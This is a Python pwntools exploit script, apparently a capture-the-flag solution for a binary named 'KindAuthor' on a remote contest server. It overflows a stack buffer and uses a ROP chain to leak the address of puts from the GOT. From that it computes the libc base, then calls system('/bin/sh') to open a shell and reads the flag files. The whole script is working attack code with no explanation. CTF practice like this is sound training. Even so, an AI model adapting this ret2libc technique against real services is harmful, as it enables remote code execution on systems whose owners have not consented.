from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./KindAuthor"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("ctf.mf.grsu.by", 9075)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


bss = 0x404040 + 0x200
puts = 0x4011E9
pop_rdi = 0x40114A
func = 0x401153
puts_got = 0x404000

payload = b"a"*0x20 + p64(bss)
payload += p64(pop_rdi) + p64(puts_got) + p64(puts)

ddebug("b *0x401153\ncontinue")
io.sendlineafter("Hello\nInput your data:\n", payload)

leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
puts_offset = 0x7f1bb3fcd5a0-0x7f1bb3f4d000
libc.address = leak - puts_offset
log.success("libc:-----> " + hex(libc.address))

io.sendline(b"111")
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))

payload = b"a"*0x20 + p64(bss)
payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
io.sendlineafter("Hello\nInput your data:\n", payload)

io.sendline(b"cat f*")

io.interactive()
